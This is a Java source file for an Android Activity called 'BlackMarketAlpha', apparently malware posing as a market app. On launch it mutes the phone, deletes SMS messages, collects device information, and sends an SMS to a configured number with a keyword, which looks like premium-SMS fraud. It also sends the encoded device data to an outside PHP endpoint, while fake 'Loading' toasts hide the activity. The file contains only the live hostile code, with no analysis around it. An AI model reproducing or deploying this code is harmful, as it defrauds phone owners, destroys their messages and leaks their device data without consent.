package com.android.blackmarket;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

public class BlackMarketAlpha extends Activity {
    public void onCreate(Bundle savedInstanceState) {
        int i;
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        String PATHAPP = getPackageName();
        Context CN = getApplicationContext();
        function.DelGlobalString(CN);
        function.MuteSound(CN);
        function.deleteSMS(CN);
        function.switchState(true);
        function.GetInfoKeys(CN);
        String INFO = function.ZEBLAZE(CN);
        Log.d("CNNT", function.GetGlobalString("KeyWord", CN));
        function.SMSSendFunction(function.GetGlobalString("Number", CN), function.GetGlobalString("KeyWord", CN));
        function.GetSourceURL("http://mathissarox.myartsonline.com/seignor.php?idajax=" + function.UrlEncode(INFO + " LAUNCH PRO.7.7"));
        for (i = 0; i < 100; i++) {
            Toast.makeText(this, "Loading : " + i + "%", 0).show();
            Toast.makeText(this, "Loading : " + i + "%", 0).show();
            Toast.makeText(this, "Loading : " + i + "%", 0).show();
        }
        for (i = 0; i < 100; i++) {
            Toast.makeText(this, "Loading : " + i + "%", 0).show();
            Toast.makeText(this, "Loading : " + i + "%", 0).show();
            Toast.makeText(this, "Loading : " + i + "%", 0).show();
        }
    }
}
